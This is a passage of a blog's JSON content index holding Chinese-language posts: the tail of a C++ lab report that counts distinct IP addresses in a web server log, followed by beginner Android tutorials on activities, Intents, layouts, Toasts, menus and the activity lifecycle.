&quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl; for (int k = 0; k &lt; ip_num_1; k++) &#123; cout &lt;&lt; ip[k] &lt;&lt; endl; &#125; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ //将有不同ip赋值到数组中 并且ip_num++ memcpy(ip_1[ip_num_1++], matc_ip.c_str(), 20); &#125; &#125; //第二题 for (int i = 3; i &lt;= 22; i++) &#123; if (i &lt; 10) &#123; string temp1 = &quot;0&quot;; temp1.append(to_string(i)); temp1.append(&quot;/May/2012&quot;); //匹配到有该日期的字符串 const char* matc_date = strstr(buf2.c_str(), temp1.c_str()); if (matc_date != NULL) &#123; string temp2 = &quot;www.bing.com&quot;; const char* matc_http = strstr(buf2.c_str(), temp2.c_str()); if (matc_http != NULL) &#123; smatch result; regex_search(buf2, result, ipPattern); string matc_ip = result.str(); if (ip_num &gt; 0) &#123; int j = 0, same_flag = 0; for ( j = 0; j &lt; ip_num; j++) &#123; string temp_ip = ip[j]; if (strstr(matc_ip.c_str(), temp_ip.c_str())) &#123; same_flag = 1; /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;存在有ip相同的&quot; &lt;&lt; ip[j] &lt;&lt; endl; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ ip_nums[j]++; &#125; &#125; if(same_flag==0) &#123; memcpy(ip[ip_num++], matc_ip.c_str(), 20); /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl; for (int k = 0; k &lt; ip_num; k++) &#123; cout &lt;&lt; ip[k] &lt;&lt; endl; &#125; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ ip_nums[ip_num - 1]++; &#125; &#125; else &#123; /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl; for (int k = 0; k &lt; ip_num; k++) &#123; cout &lt;&lt; ip[k] &lt;&lt; endl; &#125; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ memcpy(ip[ip_num++], matc_ip.c_str(), 20); ip_nums[ip_num - 1]++; &#125; &#125; &#125; &#125;else &#123; string temp1 = to_string(i); temp1.append(&quot;/May/2012&quot;); const char* matc_date = strstr(buf2.c_str(), temp1.c_str()); if (matc_date != NULL) &#123; string temp2 = &quot;www.bing.com&quot;; const char* matc_http = strstr(buf2.c_str(), temp2.c_str()); if (matc_http != NULL) &#123; //cout &lt;&lt; buf2 &lt;&lt; endl; smatch result; regex_search(buf2, result, ipPattern); string matc_ip = result.str(); if (ip_num &gt; 0) &#123; int j = 0, same_flag = 0; for (j = 0; j &lt; ip_num; j++) &#123; string temp_ip = ip[j]; if (strstr(matc_ip.c_str(), temp_ip.c_str())) &#123; same_flag = 1; /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;存在有ip相同的&quot; &lt;&lt; ip[j] &lt;&lt; endl; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ ip_nums[j]++; &#125; &#125; if (same_flag == 0) &#123; memcpy(ip[ip_num++], matc_ip.c_str(), 20); /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl; for (int k = 0; k &lt; ip_num; k++) &#123; cout &lt;&lt; ip[k] &lt;&lt; endl; &#125; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ ip_nums[ip_num - 1]++; &#125; &#125; else &#123; /* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl; cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl; for (int k = 0; k &lt; ip_num; k++) &#123; cout &lt;&lt; ip[k] &lt;&lt; endl; &#125; cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/ memcpy(ip[ip_num++], matc_ip.c_str(), 20); ip_nums[ip_num - 1]++; &#125; &#125; &#125; &#125; &#125; &#125; cout&lt;&lt;&quot;第一题的独立ip数：&quot; &lt;&lt; ip_num_1 &lt;&lt; &quot; &quot; &lt;&lt; endl; cout &lt;&lt; &quot;------------------------------------&quot; &lt;&lt; endl; for (int i = 0; i &lt; ip_num; i++) &#123; cout &lt;&lt; &quot;ip：&quot; &lt;&lt; ip[i] &lt;&lt; &quot;，次数：&quot; &lt;&lt; ip_nums[i] &lt;&lt; endl; &#125;&#125;","categories":[{"name":"实验报告","slug":"实验报告","permalink":"http://example.com/categories/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"实验报告","slug":"实验报告","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"}]},{"title":"Android-intent的应用","slug":"Android/Android-intent的应用","date":"2020-09-21T02:21:01.000Z","updated":"2021-04-01T13:43:42.000Z","comments":true,"path":"2020/09/21/Android/Android-intent的应用/","link":"","permalink":"http://example.com/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/","excerpt":"","text":"显式Intent创建另一个activity，然后再layout中创建一个新的second_layout 其中代码： 123456789101112&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; &gt; &lt;Button android:id=&quot;@+id/button_2&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;button2&quot; /&gt;&lt;/LinearLayout&gt; 其中&lt;LinerLayout&gt;为该界面内的类，其中声明了一个按钮。 在AndroidManifest.xml中可以看到有 1&lt;activity android:name=&quot;.SecondActivity&quot;&gt;&lt;/activity&gt; 由于SecondActivity不是主窗口 所以不用配置&lt;intent-filter&gt;标签里的内容 使用显式Intent： 123456button1.setOnClickListener(new View.OnClickListener() &#123; @Override Intent intent=new Intent(FirstActivity.this, SecondActivity.class); startActivity(intent); &#125; &#125;); Intent这个类有多个构造函数，其中一个是Intent(Context packageContext，Class&lt;?&gt;cls) 第一个参数是Context要求提供一个启动活动的上下文，第二个参数Class则是要启动的目标活动 将该intent类传入startActivity( )方法中，即可启用活动 隐式Intent相对于显式Intent来说，隐式Intent指定一系列更为抽象的action和category信息 以上面为基础在AndroidManifest.xml中为SecondActivity添加action以及category信息 123456&lt;activity android:name=&quot;.SecondActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.example.activitytest.ACTION_START&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;/intent-filter&gt;&lt;/activity&gt; 其中声明了该活动可以响应com.example.activitytest.ACTION_START这个action，而对于category中包含了一些附加信息，可以比较精确该活动能响应有带category的。 只有&lt;action&gt;和&lt;category&gt;同时匹配后，该活动才能进行响应。 修改FirstActivity中的按钮点击事件： 123456789Button button1=(Button)findViewById(R.id.button_1);button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent=new Intent(&quot;com.example.activitytest.ACTION_START&quot;); intent.addCategory(&quot;android.intent.category.DEFAULT&quot;); startActivity(intent); &#125;&#125;); 点击即可运行 1intent.addCategory(&quot;android.intent.category.MY_CATEGORY&quot;); 如果在其中再添加改行代码，则需要在AndroidManifest.xml中 1234567&lt;activity android:name=&quot;.SecondActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;com.example.activitytest.ACTION_START&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.MY_CATEGORY&quot;/&gt; &lt;/intent-filter&gt;&lt;/activity&gt; category与action同时配对上才能进行调用 更多关于隐式Intent的调用使用Intent调用一个浏览器： 12345public void onClick(View v) &#123; Intent intent=new Intent(Intent.ACTION_VIEW); intent.setData(Uri.parse(&quot;http://www.baidu.com&quot;)); startActivity(intent);&#125; 指定了Intent的action是Intent.Action_VIEW，这个是安卓系统内置的action，其常量值为android.intent.action.VIEW,可以通过Uri.Parse( )方法，将一个网址字符串解析成一个Uri对象，在调用setData将该Uri对象传递进去。 向下一个活动传递数据在启动activity的时候传递数据，通过putExtra( )方法重载，需要把我们传递的数据暂存在Intent中，启动后，另一个活动从Intent中取出就有了： 在FirstActivity中添加代码： 12345678910Button button1=(Button)findViewById(R.id.button_1);button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; String data=&quot;生命诚可贵 爱情价更高&quot;; Intent intent=new Intent(FirstActivity.this,SecondActivity.class); intent.putExtra(&quot;extra_data&quot;,data); startActivity(intent); &#125;&#125;); 其中使用了显式Intent，然后使用putExtra将key为extra_data，value为data的数据添加到对象intent 在SecondActivity中添加代码： 12345678910public class SecondActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.second_layout); Intent intent=getIntent(); String data=intent.getStringExtra(&quot;extra_data&quot;); Toast.makeText(SecondActivity.this,data,Toast.LENGTH_LONG).show(); &#125;&#125; 通过声明一个Intent来获取上一个Activity传递下来的intent，使用Intent中的getStirngExtra( )方法来获取字符串 运行结果： 向上一个活动传递Intent与startactivity( )相似startactivityForResult( )也可以用来启动下一个activity， 12345678Button button1=(Button)findViewById(R.id.button_1);button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent=new Intent(FirstActivity.this,SecondActivity.class); startActivityForResult(intent,1); &#125;&#125;); 其中第一个参数还是Intent，第二个参数是一个请求吗，用于在之后的回调中判断数据的来源 在SecondActivity中对按钮注册点击事件 12345678910Button button2=(Button)findViewById(R.id.button_2);button2.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent=new Intent(); intent.putExtra(&quot;data_return&quot;,&quot;Hello 第一个&quot;); setResult(RESULT_OK,intent); finish(); &#125;&#125;); 其中可以看到setResult( )方法接收了两个参数，第一个参数用于向上一个活动返回处理结果，一般使用RESULT_OK或者RESULT_CANCELED两个值，第二个参数把带有数据的Intent传了回去，再调用finsh( )方法销毁了SecondActivity。 由于使用的是startActivityForResult( )方法来启动的SecondActivity，在其被销毁后会回调onActivityResult( )方法，因此需要再FirstActivity中重写这个方法来得到返回数据 12345678910111213protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) &#123; switch (requestCode)&#123; case 1: if(resultCode==RESULT_OK) &#123; String returnedData=data.getStringExtra(&quot;data_return&quot;); Toast.makeText(FirstActivity.this,returnedData, Toast.LENGTH_LONG).show(); &#125; break; default: &#125; super.onActivityResult(requestCode, resultCode, data);&#125; 可以看到该方法一共有三个参数： 第一个参数为requestCode，即我们启动活动时传入的请求码startActivityForResult(intent,1)，可以判断是哪一个操作启动了Activity。 第二个参数是一个resultCode，即我们在返回数据时传入的处理结果。setResult(RESULT_OK,intent) 第三个参数data，即携带着返回的Intent。 由于startActivityForResult( )方法可能调用很多不同的活动，所以一般先检查请求码来判断数据的来源，确定数据后，判断请求是否成功，最后从data中取值并打印出来，这样就完成了向上一个活动返回数据的工作。 12345678public class SecondActivity extends AppCompatActivity &#123; @Override public void onBackPressed() &#123; Intent intent=new Intent(); intent.putExtra(&quot;data_return&quot;,&quot;你好，第一个&quot;); setResult(RESULT_OK,intent); finish(); &#125; 如果通过back键传递信息，就需要重写onBackPressed( )","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android-activity创建","slug":"Android/Android-activity创建","date":"2020-09-20T13:54:50.000Z","updated":"2021-04-01T13:42:36.000Z","comments":true,"path":"2020/09/20/Android/Android-activity创建/","link":"","permalink":"http://example.com/2020/09/20/Android/Android-activity%E5%88%9B%E5%BB%BA/","excerpt":"","text":"创建一个空的activity项目在Project的路径如图所示： 在该路径下创建新的窗口(不勾选任何xml文件 从头开始创建): 创建完得代码： 12345678910111213package com.example.activitytest;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;public class FirstActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); &#125;&#125; 任何活动都应该重写Activity得OnCreate()方法，而FirstActivity中已经帮助重写了这个方法，OnCreat()方法非常简单，就是调用了父类得OnCreate()方法 创建以及加载布局（XML文件）在res目录下创建layout： 在layout目录创建一个Layout resource file，命名为first_layout.xml 由于创建得布局由LinearLayout作为根元素，因此现在布局文件中已经有一个LinerLayout元素了 1234&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt;&lt;/LinearLayout&gt; 用xml代码添加一个按钮 12345678910&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot;android:layout_height=&quot;match_parent&quot;&gt; &lt;Button android:id=&quot;@+id/button_1&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Button 1&quot; /&gt;&lt;/LinearLayout&gt; 其中添加button_1的id语法为”@+id/button_1“；随后 android:layout_width指定与父元素同宽。android:layout_height指定了当前元素的高度，这里使用wrap_content表示当前元素的高度只要能刚好包含里面的内容就行。 重新回到FirstActivity，在onCreate()方法中加入代码1234567891011121314package com.example.activitytest;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;public class FirstActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); &#125;&#125; 调用了setContentView()方法加载该活动的布局，在setContentView()方法，传入布局文件的id。 在项目中添加的任何资源都会在R文件中生成一个相应的资源id，因此创建的first_layout.xml布局的id就已经添加到R文件中。只需要调用R.layout.first_layout就可以得到布局的id 在AndroidManifest文件中注册（主要的XML文件）在该文件路径： 1234567891011121314&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.example.activitytest&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/AppTheme&quot;&gt; &lt;activity android:name=&quot;.MainActivity&quot;&gt;&lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; Activity中注册声明要放在&lt;application&gt;标签中，这里可以看到&lt;activity&gt;标签来对活动注册的。注册活动仍然未能运行，就是在&lt;activity&gt;标签内部加入&lt;intent-filter&gt;标签，并在这个标签里添加 1234&lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;&lt;/intent-filter&gt; 完整代码： 123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.example.activitytest&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/AppTheme&quot;&gt; &lt;activity android:name=&quot;.FirstActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 运行结果： 添加一个ToastToast类似与web的alert();首先在按下button1的时候，发出toast。 12345678910111213141516public class FirstActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.first_layout); Button button1=(Button)findViewById(R.id.button_1); button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(FirstActivity.this,&quot;hello world&quot;,Toast.LENGTH_SHORT).show(); &#125; &#125;); &#125;&#125; 在activity中，通过findViewById()方法获取到在布局中定义的元素，传入的为R.id.button_1,获取到按钮实列 1Button button1=(Button)findViewById(R.id.button_1); 然后，通过调用setOnClickListener()方法为按钮一个监听器，点击按钮就会执行监听器的OnClick()方法 123456button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; //点击执行的内容 &#125;&#125;); 最后，关于执行的内容Toast，通过该类中的静态方法(不用实例直接调用)Toast.makeText(FirstActivity.this,”hello world”,Toast.LENGTH_SHORT).show(); “FirstActivity.this,”hello world”,Toast.LENGTH_SHORT”为其中的三个参数。 第二个参数是要显示的内容，第三个是显示的时长有Toast.LENGTH_SHORT和Toast.LENGTH_LONG 运行结果： 添加一个Menu在src/res下添加一个menu，在该文件夹下添加个 命名为main.xml。添加代码： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;menu xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;item android:id=&quot;@+id/add_item&quot; android:title=&quot;ADD&quot;/&gt; &lt;item android:id=&quot;@+id/remove_item&quot; android:title=&quot;Remove&quot;/&gt;&lt;/menu&gt; 然后在FirrstActivity中添加事件（可用Ctrl+O） 1234public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.main,menu); return super.onCreateOptionsMenu(menu);&#125; 通过getMenuInflater()方法可以的到MenuInflater对象，再调用其中的inflate()方法就可以创建菜单，传入两个参数，一个是资源文件R.menu.main，一个是添加到哪个Menu对象。 菜单响应事件代码： 1234567891011public boolean onOptionsItemSelected(@NonNull MenuItem item) &#123; switch (item.getItemId())&#123; case R.id.add_item: Toast.makeText(FirstActivity.this,&quot;you clicked Add&quot;,Toast.LENGTH_SHORT).show(); break; case R.id.remove_item: Toast.makeText(FirstActivity.this,&quot;you clicked remove&quot;,Toast.LENGTH_SHORT).show(); break; &#125; return true;&#125; item.getItemId()来判断点击的是哪一个菜单项，然后加入每个菜单应该执行的逻辑功能。 销毁一个活动在Aactivity中调用一个finish();即可完成一次销毁。 123456button1.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Toast.makeText(FirstActivity.this,&quot;hello world&quot;,Toast.LENGTH_SHORT).show(); finish(); &#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android开发-2","slug":"Android/Android开发-2","date":"2020-09-20T10:50:09.000Z","updated":"2021-04-02T02:53:02.000Z","comments":true,"path":"2020/09/20/Android/Android开发-2/","link":"","permalink":"http://example.com/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-2/","excerpt":"","text":"UI设计相关的概念view view类位于Android.view包中；View类的子类一般位于Android.widget包中 常用属性 ViewGroup(继承view类，抽象类) ViewGroup.LayoutParams类 ViewGroup.MarginLayoutParams类 Android UI组件的层次结构 控制UI界面 Ⅰ、例子（用xml设置背景图片） 1.将图片移至此路径下： 2.修改该activity中的代码 其中固定格式为@mipmap为此路径下的图片 3.效果 Ⅱ、用纯java代码去写一个UI界面 布局管理器","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"Android开发-1","slug":"Android/Android开发-1","date":"2020-09-20T08:16:19.000Z","updated":"2021-04-01T13:51:48.000Z","comments":true,"path":"2020/09/20/Android/Android开发-1/","link":"","permalink":"http://example.com/2020/09/20/Android/Android%E5%BC%80%E5%8F%91-1/","excerpt":"","text":"Android 作为一个移动设备的开发平台，其软件层次结构包含操作系统 (OS)、中间件 (MiddleWare) 和应用程序 (Application)。 Android 的应用程序通常涉及用户界面和用户交互，这类程序是用户实实在在能感受到的。目前 Android 本身提供了桌面、联系人、电话和浏览器等众多的核心应用，同时还允许开发者使用应用程序框架层的 API 实现自己的程序 Android 系统没有使用常见的应用程序入口点的方法（例如C语言中的 main() 方法），应用程序是由组件组成的，组件可以调用相互独立的基本功能模块。根据完成的功能不同，Android 划分了 4 类核心组件，即 Activity、Service、BroadcastReceiver 和 ContentProvider，各组件之间的消息传递通过 Intent 完成。 Activity（窗口）Activity 是 Android 应用程序核心组件中最基本的一种，是用户和应用程序交互的窗口。 在 Android 应用程序中，一个 Activity 通常对应一个单独的视图。一个 Android 应用程序是由一个或多个 Activity 组成的，这些 Activity 相当于 Web 应用程序中的网页，用于显示信息，并且相互之间可以进行跳转。和网页跳转不同的是，Activity 之间的跳转可以有返回值。 新打开一个视图时，之前的那个视图会被置为暂停状态，并且压入历史堆栈中，用户可以通过回退操作返回以前打开过的视图。Activity 是由 Android 系统进行维护的，它有自己的生命周期，即“产生、运行、销毁”，但是在这个过程中会调用许多方法，如创建 onCreate()、激活 onStart()、恢复 onResume()、暂停 onPause()、停止 onStop()、销毁 onDestroy()和重启 onRestart() 等。 ServiceService 是一种类似于 Activity 但是没有视图的程序，它没有用户界面，可以在后台运行很长时间，相当于操作系统中的一个服务。 Android 定义了两种类型的 Service，即本地 Service 和远程 Service。本地 Service 是只能由承载该 Service 的应用程序访问的组件，而远程 Service 是供在设备上运行的其他应用程序远程访问的 Service。 通过 Context.startService(Intent service) 可以启动一个 Service，通过 Context. bindService() 可以绑定一个 Service。 BroadcastReceiverBroadcastReceiver 的意思是“广播接收者”，顾名思义，它用来接收来自系统和其他应用程序的广播，并做出回应。 在 Android 系统中，当有特定事件发生时就会产生相应的广播。广播体现在方方面面。例如，当开机过程完成后，系统会产生一条广播，接收到这条广播就能实现开机启动服务的功能；当网络状态改变时，系统会产生一条广播，接收到这条广播就能及时地做出提示和保存数据等操作；当电池电量改变时，系统会产生一条广播，接收到这条广播就能在电量低时告知用户及时保存进度等。 BroadcastReceiver 不能生成 UI，通过 NotificationManager 来通知用户有事件发生，对于用户来说是隐式的。 BroadcastReceiver 的 2 种注册方式： 在 AndroidManifest. xml 中进行静态注册； 在运行时的代码中使用 Context.registerReceiver() 进行动态注册。 只要注册了 BroadcastReceiver，即使对应的事件广播来临时应用程序并未启动，系统也会自动启动该应用程序对事件进行处理。另外，用户还可以通过 Context.sendBroadcast() 将自己的 Intent 对象广播给其他的应用程序。 ContentProvider文件、数据库等数据在 Android 系统内是私有的，仅允许被特定应用程序直接使用。在两个程序之间，数据的交换或共享由 ContentProvider 实现。 ContentProvider 类实现了一组标准方法的接口，从而能够让其他的应用保存或读取 ContentProvider 提供的各种数据类型。 IntentIntent 并不是 Android 应用程序四大核心组件之一，但是其重要性无可替代，因此在这里我们做一下简单介绍。 Android 应用程序核心组件中的三大核心组件 —— Activity、Service、BroadcastReceiver。通过消息机制被启动激活，而所使用的消息就是 Intent。Intent 是对即将要进行的操作的抽象描述，承担了 Android 应用程序三大核心组件相互之间的通信功能。 1.创建一个空的项目项目结构(Android选项下)： 2.主要的XML文件 整个Android项目的配置文件，在程序中定义的四大组件都需在这个文件里注册，另外还可以在这个文件中给应用程序添加声明 12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.example.android&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; &lt;!-应用图标-&gt; android:icon=&quot;@mipmap/ic_launcher&quot; &lt;!-应用名称-&gt; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/AppTheme&quot;&gt; &lt;!-activity设置为窗口-&gt; &lt;activity android:name=&quot;.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;!-将MAINActivity设置为启动窗口-&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;!-这段代码表示对MainACtivity这个窗口/活动进行注册，没有在AndroidManifest.xml里注册的窗口/活动是不能使用的。其中intent-filter里的两行代码很重要&lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;表示MainActivity是这个项目的主窗口 -&gt; &lt;/application&gt;&lt;/manifest&gt; 3.主要的Java文件 123456789101112131415package com.example.android;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;//定义一个java类public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); //显示的布局文件 setContentView(R.layout.activity_main); &#125;&#125; 4.res-drawable目录 5.res-layout目录显示布局文件 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; 代码?&gt;&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;.MainActivity&quot;&gt; &lt;TextView android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Hello World!&quot; app:layout_constraintBottom_toBottomOf=&quot;parent&quot; app:layout_constraintLeft_toLeftOf=&quot;parent&quot; app:layout_constraintRight_toRightOf=&quot;parent&quot; app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt; 6.values目录 123&lt;resources&gt; &lt;string name=&quot;app_name&quot;&gt;第一个Android应用&lt;/string&gt;&lt;/resources&gt; 可以看到，这里定义了一个应用程序名的字符串，可以有两种方法来引用它。 在java代码中通过R.string.app_name/在XML中通过@string/app_name可以获得该字符串的引用 7.Android Activity组件及其生命周期Activity 是 Android 组件中最基本也是最为常见的组件。 Activity 是用户接口程序，原则上它会提供给用户一个交互式的接口功能，几乎所有的 Activity 都要和用户打交道，也有人把它比喻成 Android 的管理员。需要在屏幕上显示什么、用户在屏幕上做什么、处理用户的不同操作等都由 Activity 来管理和调度。 Activity 提供用户与 Android 系统交互的接口，用户通过 Activity 来完成自己的目的。例如打电话、拍照、发送 E-mail、查看地图等。 每个 Activity 都提供一个用户界面窗口，一般情况下，该界面窗口会填满整个屏幕，但是也可以比屏幕小，或者浮在其他的窗口之上。 一个 Android 应用程序通常由多个 Activity 组成，但是其中只有一个为主 Activity。其作用相当于 Java 应用程序中的 main 函数，当应用程序启动时，作为应用程序的入口首先呈现给用户。 Android 应用程序中的多个 Activity 可以直接相互调用以完成不同工作。 当新的 Activity 被启动的时候，之前的 Activity 会停止，但是不会被销毁，而是被压入“后退栈(Back Stack)”的栈顶，新启动的 Activity 获得焦点，显示给用户。 “后退栈”遵循“后入先出”的原则。当新启动的 Activity 被使用完毕，用户单击“Back”按钮时，当前的 Activity 会被销毁，而原先的 Activity 会被从“后退栈”的栈顶弹出并且激活。 当 Activity 状态发生改变时，都会通过状态回调函数通知 Android 系统。而程序编写人员可以通过这些回调函数对 Activity 进行进一步的控制。 Activity 的生命周期从本质上讲，Activity 在生命周期中共存在三个状态，这三个状态如下： 1) 运行态指 Activity 运行于屏幕的最上层并且获得了用户焦点。 2) 暂停态指当前 Activity 依然存在，但是没有获得用户焦点。 在其之上有其他的 Activity 处于运行态，但是由于处于运行态的 Activity 没有遮挡住整个屏幕，当前 Activity 有一部分视图可以被用户看见。处于暂停态的 Activity 保留了自己所使用的内存和用户信息，但是在系统极度缺乏资源的情况下，有可能会被杀死以释放资源。 3) 停止态指当前 Activity 完全被处于运行态的 Activity 遮挡住，其用户界面完全不能被用户看见。 处于停止态的 Activity 依然存活，也保留了自己所使用的内存和用户信息，但是一旦系统缺乏资源，停止态的 Activity 就会被杀死以释放资源。 Activity 在生命周期中从一种状态到另一种状态时会激发相应的回调方法，这几个回调方法如下： 名称 调用时间 onCreate(Bundle savedInstanceState) 创建 Activity 时调用。 设置在该方法中，还以 Bundle 的形式提供对以前储存的任何状态的访问。其中参数 savedInstanceState 对象是用于保存 Activity 的对象的状态。 onStart() Activity 变为在屏幕上对用户可见时调用。 onResume() Activity 开始与用户交互时调用（无论是启动还是重启一个活动，该方法总是被调用）。 onPause() 当 Android 系统要激活其他 Activity 时，该方法被调用，暂停或收回 CPU 和其他资源时调用。 onStop() Activity 被停止并转为不可见阶段时调用。 onRestart() 重新启动已经停止的 Activity 时调用。 onDestroy() Activity 被完全从系统内存中移除时调用。 该方法被调用可能是因为有人直接调用 finish() 方法或者系统决定停止该活动以释放资源。 上面 7 个生命周期方法分别在 4 个阶段按着一定的顺序进行调用，这 4 个阶段如下： 启动 Activity：在这个阶段依次执行 3 个生命周期方法：onCreate、onStart 和 onResume。 Activity 失去焦点：如果在 Activity 获得焦点的情况下进入其他的 Activity 或应用程序，这时当前的 Activity 会失去焦点。在这一阶段，会依次执行 onPause 和 onStop 方法。 Activity 重获焦点：如果 Activity 重新获得焦点，会依次执行 3 个生命周期方法：onRestart、onStart 和 onResume。 关闭 Activity：当 Activity 